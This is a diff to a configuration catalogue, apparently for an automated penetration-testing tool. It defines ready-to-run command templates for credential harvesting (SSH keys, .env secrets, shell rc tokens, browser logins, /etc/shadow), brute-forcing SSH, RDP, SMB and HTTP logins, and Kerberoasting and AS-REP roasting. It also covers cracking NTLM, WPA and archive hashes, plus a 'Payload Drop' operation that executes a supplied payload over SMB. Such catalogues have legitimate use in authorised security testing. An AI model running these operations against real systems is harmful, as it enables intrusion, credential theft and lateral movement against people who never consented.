 name = 'Db Connect Strings'
-args = ['-riE', 'jdbc|mysql://|postgres://|mongodb://', '{path}', '2>/dev/null']
+args = ['-riE', 'jdbc|mysql://|postgres://|mongodb://', '{path}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'History Files'
-args = ['{path}', '-name', '.*history', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', '.*history', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8372,14 +8369,14 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'SSH Config Harvest'
-args = ['{path}', '-name', 'config', '-path', '*/.ssh/*', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', 'config', '-path', '*/.ssh/*', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Env File Creds'
-args = ['-riE', '=.{4,}', '{path}/.env', '2>/dev/null']
+args = ['-riE', '=.{4,}', '{path}/.env']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8400,14 +8397,14 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Cloud Key Sweep'
-args = ['-riE', 'aws_secret|api_key|secret_key', '/var/www/', '/opt/', '2>/dev/null']
+args = ['-riE', 'aws_secret|api_key|secret_key', '/var/www/', '/opt/']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Backup Config Sweep'
-args = ['{path}', '-name', '*.bak', '-o', '-name', '*.old', '-o', '-name', '*.conf.*', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', '*.bak', '-o', '-name', '*.old', '-o', '-name', '*.conf.*', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8421,7 +8418,7 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Docker Compose Creds'
-args = ['-riE', 'password|secret', '{path}', '--include=docker-compose.yml', '--include=.env', '2>/dev/null']
+args = ['-riE', 'password|secret', '{path}', '--include=docker-compose.yml', '--include=.env']
 output = 'lines'
 network = false
 
@@ -8438,14 +8435,14 @@ inputs = [
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Private Key Sweep'
-args = ['{path}', '-name', 'id_rsa', '-o', '-name', 'id_ed25519', '-o', '-name', '*.pem', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', 'id_rsa', '-o', '-name', 'id_ed25519', '-o', '-name', '*.pem', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'SSH Dir Inventory'
-args = ['{path}', '-name', '.ssh', '-type', 'd', '2>/dev/null']
+args = ['{path}', '-name', '.ssh', '-type', 'd']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8508,7 +8505,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Encrypted Key Detect'
-args = ['{path}', '-name', 'id_rsa', '-type', 'f', '-exec', 'grep', '-l', 'ENCRYPTED', '{}', ';', '2>/dev/null']
+args = ['{path}', '-name', 'id_rsa', '-type', 'f', '-exec', 'grep', '-l', 'ENCRYPTED', '{}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8561,8 +8558,8 @@ network = true
 [[capability.provider]]
 binary = 'nxc'
 [[capability.provider.operation]]
-name = 'Payload Drop C$
-args = []
+name = 'Payload Drop C2 Drop'
+args = ['--exec', '{payload}']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -8722,14 +8719,14 @@ inputs = [
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Writable Etc Files'
-args = ['/etc/', '-writable', '-type', 'f', '2>/dev/null']
+args = ['/etc/', '-writable', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Writable Root Dirs'
-args = ['/', '-maxdepth', '3', '-writable', '-type', 'd', '2>/dev/null']
+args = ['/', '-maxdepth', '3', '-writable', '-type', 'd']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8750,14 +8747,14 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'World Writable Files'
-args = ['/', '-type', 'f', '-perm', '-0002', '2>/dev/null']
+args = ['/', '-type', 'f', '-perm', '-0002']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Group Writable Root'
-args = ['/', '-type', 'f', '-perm', '-0020', '-user', 'root', '2>/dev/null']
+args = ['/', '-type', 'f', '-perm', '-0020', '-user', 'root']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8778,7 +8775,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Sticky World Writable Dirs'
-args = ['/', '-type', 'd', '-perm', '-0002', '-not', '-perm', '-1000', '2>/dev/null']
+args = ['/', '-type', 'd', '-perm', '-0002', '-not', '-perm', '-1000']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -8850,7 +8847,7 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Shell RC Secrets'
-args = ['-riE', 'export.*(key|token|pass|secret)', '/home/*/.bashrc', '/home/*/.profile', '/home/*/.zshrc', '2>/dev/null']
+args = ['-riE', 'export.*(key|token|pass|secret)', '/home/*/.bashrc', '/home/*/.profile', '/home/*/.zshrc']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -9175,7 +9172,7 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'DB Config Creds'
-args = ['-riE', 'password|user', '/etc/mysql/', '/etc/postgresql/', '2>/dev/null']
+args = ['-riE', 'password|user', '/etc/mysql/', '/etc/postgresql/']
 output = 'lines'
 network = false
 
@@ -9192,7 +9189,7 @@ inputs = [
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Web Root Writability'
-args = ['/var/www/', '/opt/lampp/htdocs/', '-writable', '-type', 'd', '2>/dev/null']
+args = ['/var/www/', '/opt/lampp/htdocs/', '-writable', '-type', 'd']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -9255,7 +9252,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Web Root Content Discover'
-args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,301,403', '-t', '20']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/common.txt}', '-mc', '200,301,403', '-t', '20']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -9281,6 +9278,7 @@ summary = 'Detect log injection potential for LFI-to-RCE chains'
 inputs = [
   { key = 'log-path', type = 'file', required = false, default = '/var/log/apache2/access.log' },
   { key = 'marker', type = 'text', required = false, default = 'tsprobe' },
+  { key = 'url', type = 'url', required = true },
 ]
 [[capability.provider]]
 binary = 'curl'
@@ -9349,14 +9347,14 @@ network = true
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'PHP Session Scan'
-args = ['-rl', '{marker}', '/var/lib/php/sessions/', '/tmp/', '2>/dev/null']
+args = ['-rl', '{marker}', '/var/lib/php/sessions/', '/tmp/']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Readable Log Sweep'
-args = ['/var/log/', '-readable', '-type', 'f', '2>/dev/null']
+args = ['/var/log/', '-readable', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -9583,7 +9581,7 @@ network = true
 binary = 'impacket-GetNPUsers'
 [[capability.provider.operation]]
 name = 'ASREP Roast'
-args = ['{domain}/', '-usersfile', '/tmp/users.txt', '-no-pass', '-outputfile', '/tmp/asrep']
+args = ['{domain}/', '-usersfile', '{wl:ad/users.txt}', '-no-pass', '-outputfile', '/tmp/asrep']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -9676,14 +9674,14 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'SUID Audit'
-args = ['/', '-perm', '-4000', '-type', 'f', '2>/dev/null']
+args = ['/', '-perm', '-4000', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'getcap'
 [[capability.provider.operation]]
 name = 'Capability Audit'
-args = ['-r', '/', '2>/dev/null']
+args = ['-r', '/']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -9711,7 +9709,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Writable Path Audit'
-args = ['/', '-maxdepth', '3', '-writable', '-type', 'd', '2>/dev/null']
+args = ['/', '-maxdepth', '3', '-writable', '-type', 'd']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -9888,7 +9886,7 @@ network = false
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Mode List Grep'
-args = ['--help', '|', 'grep', '-i', 'sha']
+args = ['--help']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -9941,28 +9939,27 @@ label = 'HASH CRACKING'
 summary = 'Crack recovered hashes with rule and wordlist driven attacks'
 inputs = [
   { key = 'hashes', type = 'file', required = true },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
   { key = 'mode', type = 'text', required = false, default = '1000' },
 ]
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Dictionary Attack'
-args = ['-m', '{mode}', '-a', '0', '{hashes}', '{wordlist}', '--potfile-disable']
+args = ['-m', '{mode}', '-a', '0', '{hashes}', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Rule Attack'
-args = ['-m', '{mode}', '-a', '0', '{hashes}', '{wordlist}', '-r', '/usr/share/hashcat/rules/best64.rule', '--potfile-disable']
+args = ['-m', '{mode}', '-a', '0', '{hashes}', '{wl:passwords/rockyou.txt}', '-r', '{wl:rules/best66.rule}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Combination Attack'
-args = ['-m', '{mode}', '-a', '1', '{hashes}', '{wordlist}', '{wordlist}', '--potfile-disable']
+args = ['-m', '{mode}', '-a', '1', '{hashes}', '{wl:passwords/rockyou.txt}', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -9990,14 +9987,14 @@ network = false
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Wordlist Run'
-args = ['--wordlist={wordlist}', '{hashes}']
+args = ['--wordlist={wl:passwords/rockyou.txt}', '{hashes}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Rule Run'
-args = ['--wordlist={wordlist}', '--rules=Jumbo', '{hashes}']
+args = ['--wordlist={wl:passwords/rockyou.txt}', '--rules=Jumbo', '{hashes}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10106,21 +10103,21 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'NTLM Crack Pass'
-args = ['-m', '1000', '-a', '0', '/tmp/ntds.ntds', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+args = ['-m', '1000', '-a', '0', '/tmp/ntds.ntds', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Kerberoast Crack'
-args = ['-m', '13100', '-a', '0', '/tmp/kerberoast.out', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+args = ['-m', '13100', '-a', '0', '/tmp/kerberoast.out', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'ASREP Crack'
-args = ['-m', '18200', '-a', '0', '/tmp/asrep.out', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+args = ['-m', '18200', '-a', '0', '/tmp/asrep.out', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 
@@ -10133,8 +10130,6 @@ inputs = [
   { key = 'rhost', type = 'target', required = true },
   { key = 'username', type = 'username', required = true },
   { key = 'password', type = 'password', required = true },
-  { key = 'userlist', type = 'file', required = false, default = '/tmp/users.txt' },
-  { key = 'passlist', type = 'file', required = false, default = '/tmp/passwords.txt' },
 ]
 [[capability.provider]]
 binary = 'nxc'
@@ -10147,14 +10142,14 @@ network = true
 binary = 'nxc'
 [[capability.provider.operation]]
 name = 'User Password Pair Spray'
-args = ['smb', '{rhost}', '-u', '{userlist}', '-p', '{passlist}', '--no-bruteforce']
+args = ['smb', '{rhost}', '-u', '{wl:smb/users.txt}', '-p', '{wl:smb/passwords.txt}', '--no-bruteforce']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nxc'
 [[capability.provider.operation]]
 name = 'Password Across Users'
-args = ['smb', '{rhost}', '-u', '{userlist}', '-p', '{password}']
+args = ['smb', '{rhost}', '-u', '{wl:smb/users.txt}', '-p', '{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -10168,21 +10163,21 @@ network = true
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'SMB Brute'
-args = ['-L', '{userlist}', '-P', '{passlist}', '{rhost}', 'smb']
+args = ['-L', '{wl:smb/users.txt}', '-P', '{wl:smb/passwords.txt}', '{rhost}', 'smb']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'medusa'
 [[capability.provider.operation]]
 name = 'SMB Alt Brute'
-args = ['-H', '{rhost}', '-U', '{userlist}', '-P', '{passlist}', '-M', 'smb']
+args = ['-H', '{rhost}', '-U', '{wl:smb/users.txt}', '-P', '{wl:smb/passwords.txt}', '-M', 'smb']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'crackmapexec'
 [[capability.provider.operation]]
 name = 'Compat Spray'
-args = ['smb', '{rhost}', '-u', '{userlist}', '-p', '{passlist}']
+args = ['smb', '{rhost}', '-u', '{wl:smb/users.txt}', '-p', '{wl:smb/passwords.txt}']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -10229,48 +10224,48 @@ summary = 'Brute force HTTP basic, form and API authentication'
 inputs = [
   { key = 'url', type = 'url', required = true },
   { key = 'username', type = 'username', required = false, default = 'admin' },
-  { key = 'passlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
+  { key = 'password', type = 'password', required = false },
 ]
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'Basic Auth Brute'
-args = ['-l', '{username}', '-P', '{passlist}', '{url}', 'http-get', '/admin']
+args = ['-l', '{username}', '-P', '{wl:passwords/common-10k.txt}', '{url}', 'http-get', '/admin']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'Form Post Brute'
-args = ['-l', '{username}', '-P', '{passlist}', '{url}', 'http-post-form', '/login:user=^USER^&pass=^PASS^:F=incorrect']
+args = ['-l', '{username}', '-P', '{wl:passwords/common-10k.txt}', '{url}', 'http-post-form', '/login:user=^USER^&pass=^PASS^:F=incorrect']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'HTTP Digest Brute'
-args = ['-l', '{username}', '-P', '{passlist}', '{url}', 'http-digest-get', '/']
+args = ['-l', '{username}', '-P', '{wl:passwords/common-10k.txt}', '{url}', 'http-digest-get', '/']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'medusa'
 [[capability.provider.operation]]
 name = 'HTTP Alt Brute'
-args = ['-U', '/tmp/users.txt', '-P', '{passlist}', '-h', '{url}', '-M', 'http']
+args = ['-U', '{wl:users/defaults.txt}', '-P', '{wl:passwords/common-10k.txt}', '-h', '{url}', '-M', 'http']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Login Fuzz'
-args = ['-u', '{url}/login', '-X', 'POST', '-d', 'username=admin&password=FUZZ', '-w', '{passlist}', '-mc', '200,302', '-t', '10']
+args = ['-u', '{url}/login', '-X', 'POST', '-d', 'username=admin&password=FUZZ', '-w', '{wl:passwords/common-10k.txt}', '-mc', '200,302', '-t', '10']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'wfuzz'
 [[capability.provider.operation]]
 name = 'Login Alt Fuzz'
-args = ['-z', 'file,{passlist}', '-d', 'username=admin&password=FUZZ', '{url}/login']
+args = ['-z', 'file,{wl:passwords/common-10k.txt}', '-d', 'username=admin&password=FUZZ', '{url}/login']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -10312,7 +10307,7 @@ network = true
 binary = 'ffuf'
 [[capability.provider.operation]]
 name = 'Login Page Discover'
-args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/big.txt', '-mc', '200', '-t', '20']
+args = ['-u', '{url}/FUZZ', '-w', '{wl:web/big.txt}', '-mc', '200', '-t', '20']
 output = 'lines'
 network = true
 
@@ -10324,90 +10319,89 @@ summary = 'Brute force network service authentication across protocols'
 inputs = [
   { key = 'rhost', type = 'target', required = true },
   { key = 'username', type = 'username', required = true },
-  { key = 'passlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
 ]
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'SSH Brute'
-args = ['-l', '{username}', '-P', '{passlist}', '{rhost}', 'ssh', '-t', '4']
+args = ['-l', '{username}', '-P', '{wl:passwords/common-10k.txt}', '{rhost}', 'ssh', '-t', '4']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'FTP Brute'
-args = ['-l', '{username}', '-P', '{passlist}', '{rhost}', 'ftp']
+args = ['-l', '{username}', '-P', '{wl:passwords/common-10k.txt}', '{rhost}', 'ftp']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'MySQL Brute'
-args = ['-l', 'root', '-P', '{passlist}', '{rhost}', 'mysql']
+args = ['-l', 'root', '-P', '{wl:passwords/common-10k.txt}', '{rhost}', 'mysql']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'Postgres Brute'
-args = ['-l', 'postgres', '-P', '{passlist}', '{rhost}', 'postgres']
+args = ['-l', 'postgres', '-P', '{wl:passwords/common-10k.txt}', '{rhost}', 'postgres']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'RDP Brute'
-args = ['-l', 'administrator', '-P', '{passlist}', '{rhost}', 'rdp']
+args = ['-l', 'administrator', '-P', '{wl:passwords/common-10k.txt}', '{rhost}', 'rdp']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'Telnet Brute'
-args = ['-l', 'admin', '-P', '{passlist}', '{rhost}', 'telnet']
+args = ['-l', 'admin', '-P', '{wl:passwords/common-10k.txt}', '{rhost}', 'telnet']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'VNC Brute'
-args = ['-P', '{passlist}', '{rhost}', 'vnc']
+args = ['-P', '{wl:passwords/common-10k.txt}', '{rhost}', 'vnc']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'SMTP Brute'
-args = ['-l', '{username}', '-P', '{passlist}', '{rhost}', 'smtp']
+args = ['-l', '{username}', '-P', '{wl:passwords/common-10k.txt}', '{rhost}', 'smtp']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hydra'
 [[capability.provider.operation]]
 name = 'POP3 Brute'
-args = ['-l', '{username}', '-P', '{passlist}', '{rhost}', 'pop3']
+args = ['-l', '{username}', '-P', '{wl:passwords/common-10k.txt}', '{rhost}', 'pop3']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ncrack'
 [[capability.provider.operation]]
 name = 'SSH Alt Brute'
-args = ['ssh:{rhost}', '-U', '{username}', '-P', '{passlist}']
+args = ['ssh:{rhost}', '-U', '{username}', '-P', '{wl:passwords/common-10k.txt}']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'ncrack'
 [[capability.provider.operation]]
 name = 'RDP Alt Brute'
-args = ['rdp:{rhost}', '-P', '{passlist}']
+args = ['rdp:{rhost}', '-P', '{wl:passwords/common-10k.txt}']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'medusa'
 [[capability.provider.operation]]
 name = 'SSH Alt Brute'
-args = ['-H', '{rhost}', '-u', '{username}', '-P', '{passlist}', '-M', 'ssh']
+args = ['-H', '{rhost}', '-u', '{username}', '-P', '{wl:passwords/common-10k.txt}', '-M', 'ssh']
 output = 'lines'
 network = true
 
@@ -10421,7 +10415,6 @@ inputs = [
   { key = 'domain', type = 'domain', required = true },
   { key = 'username', type = 'username', required = true },
   { key = 'password', type = 'password', required = true },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
 ]
 [[capability.provider]]
 binary = 'impacket-getUserSPNs'
@@ -10448,28 +10441,28 @@ network = true
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Ticket Crack'
-args = ['-m', '13100', '-a', '0', '/tmp/kerberoast.out', '{wordlist}', '--potfile-disable']
+args = ['-m', '13100', '-a', '0', '/tmp/kerberoast.out', '{wl:ad/passwords.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Ticket Crack Alt'
-args = ['--wordlist={wordlist}', '--format=krb5tgs', '/tmp/kerberoast.out']
+args = ['--wordlist={wl:ad/passwords.txt}', '--format=krb5tgs', '/tmp/kerberoast.out']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'impacket-GetNPUsers'
 [[capability.provider.operation]]
 name = 'ASREP Harvest'
-args = ['{domain}/', '-usersfile', '/tmp/users.txt', '-no-pass', '-outputfile', '/tmp/asrep.out']
+args = ['{domain}/', '-usersfile', '{wl:ad/users.txt}', '-no-pass', '-outputfile', '/tmp/asrep.out']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'ASREP Crack'
-args = ['-m', '18200', '-a', '0', '/tmp/asrep.out', '{wordlist}', '--potfile-disable']
+args = ['-m', '18200', '-a', '0', '/tmp/asrep.out', '{wl:ad/passwords.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10515,13 +10508,12 @@ label = 'WIFI HANDSHAKE CRACK'
 summary = 'Crack captured WPA handshakes and PMKIDs'
 inputs = [
   { key = 'capture', type = 'file', required = false, default = '/tmp/capture.cap' },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
 ]
 [[capability.provider]]
 binary = 'aircrack-ng'
 [[capability.provider.operation]]
 name = 'Handshake Crack'
-args = ['-w', '{wordlist}', '{capture}']
+args = ['-w', '{wl:wifi/passphrases.txt}', '{capture}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10535,21 +10527,21 @@ network = false
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'WPA Crack 22000'
-args = ['-m', '22000', '-a', '0', '{capture}', '{wordlist}', '--potfile-disable']
+args = ['-m', '22000', '-a', '0', '{capture}', '{wl:wifi/passphrases.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'PMKID Crack 16800'
-args = ['-m', '16800', '-a', '0', '/tmp/pmkid.16800', '{wordlist}', '--potfile-disable']
+args = ['-m', '16800', '-a', '0', '/tmp/pmkid.16800', '{wl:wifi/passphrases.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'WEP Crack 1'
-args = ['-m', '1', '-a', '0', '{capture}', '{wordlist}', '--potfile-disable']
+args = ['-m', '1', '-a', '0', '{capture}', '{wl:wifi/passphrases.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10563,7 +10555,7 @@ network = false
 binary = 'john'
 [[capability.provider.operation]]
 name = 'WPA Crack Alt'
-args = ['--wordlist={wordlist}', '{capture}']
+args = ['--wordlist={wl:wifi/passphrases.txt}', '{capture}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10609,21 +10601,20 @@ label = 'SSH KEY CRACK'
 summary = 'Recover SSH private key passphrases and test key reuse'
 inputs = [
   { key = 'key', type = 'file', required = true },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
   { key = 'rhost', type = 'target', required = false, default = '' },
 ]
 [[capability.provider]]
 binary = 'ssh2john'
 [[capability.provider.operation]]
 name = 'Key To Hash'
-args = ['{key}', '>', '/tmp/ssh.hash']
+args = ['{key}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Passphrase Crack'
-args = ['--wordlist={wordlist}', '/tmp/ssh.hash']
+args = ['--wordlist={wl:ssh/passphrases.txt}', '/tmp/ssh.hash']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10637,7 +10628,7 @@ network = false
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'RSA Key Crack'
-args = ['-m', '22921', '-a', '0', '/tmp/ssh.hash', '{wordlist}', '--potfile-disable']
+args = ['-m', '22921', '-a', '0', '/tmp/ssh.hash', '{wl:ssh/passphrases.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10686,7 +10677,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Key Inventory Sweep'
-args = ['/', '-name', 'id_rsa', '-o', '-name', 'id_ed25519', '-type', 'f', '2>/dev/null']
+args = ['/', '-name', 'id_rsa', '-o', '-name', 'id_ed25519', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10704,13 +10695,12 @@ label = 'ZIP ARCHIVE CRACK'
 summary = 'Recover passwords from encrypted archives'
 inputs = [
   { key = 'archive', type = 'file', required = true },
-  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
 ]
 [[capability.provider]]
 binary = 'fcrackzip'
 [[capability.provider.operation]]
 name = 'Dictionary Crack'
-args = ['-D', '-p', '{wordlist}', '-u', '{archive}']
+args = ['-D', '-p', '{wl:passwords/rockyou.txt}', '-u', '{archive}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10724,21 +10714,21 @@ network = false
 binary = 'zip2john'
 [[capability.provider.operation]]
 name = 'Zip To Hash'
-args = ['{archive}', '>', '/tmp/zip.hash']
+args = ['{archive}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Zip Hash Crack'
-args = ['--wordlist={wordlist}', '/tmp/zip.hash']
+args = ['--wordlist={wl:passwords/rockyou.txt}', '/tmp/zip.hash']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = 'Zip PKZIP Crack'
-args = ['-m', '17200', '-a', '0', '/tmp/zip.hash', '{wordlist}', '--potfile-disable']
+args = ['-m', '17200', '-a', '0', '/tmp/zip.hash', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10759,7 +10749,7 @@ network = false
 binary = 'rar2john'
 [[capability.provider.operation]]
 name = 'Rar To Hash'
-args = ['{archive}', '>', '/tmp/rar.hash']
+args = ['{archive}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10817,21 +10807,21 @@ network = false
 binary = 'unshadow'
 [[capability.provider.operation]]
 name = 'Unshadow Combine'
-args = ['/etc/passwd', '/etc/shadow', '>', '/tmp/unshadow.txt']
+args = ['/etc/passwd', '/etc/shadow']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'Shadow Crack'
-args = ['--wordlist=/usr/share/wordlists/rockyou.txt', '/tmp/unshadow.txt']
+args = ['--wordlist={wl:passwords/rockyou.txt}', '/tmp/unshadow.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Git Config Cred Scan'
-args = ['-riE', 'user|password|token', '{path}/.gitconfig', '2>/dev/null']
+args = ['-riE', 'user|password|token', '{path}/.gitconfig']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10845,7 +10835,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Keyring Locate'
-args = ['{path}', '-name', '*.keyring', '-o', '-name', 'kwallet*', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', '*.keyring', '-o', '-name', 'kwallet*', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10866,7 +10856,7 @@ network = false
 binary = 'find'
 [[capability.provider.operation]]
 name = 'Firefox Profile Locate'
-args = ['{path}', '-name', 'logins.json', '-type', 'f', '2>/dev/null']
+args = ['{path}', '-name', 'logins.json', '-type', 'f']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -10880,7 +10870,7 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'WP Config Creds'
-args = ['-rE', 'DB_PASSWORD|DB_USER', '/var/www/', '2>/dev/null']
+args = ['-rE', 'DB_PASSWORD|DB_USER', '/var/www/']
 output = 'lines'
 network = false
 
@@ -10991,21 +10981,21 @@ inputs = [
 binary = 'find'
 [[capability.provider.operation]]
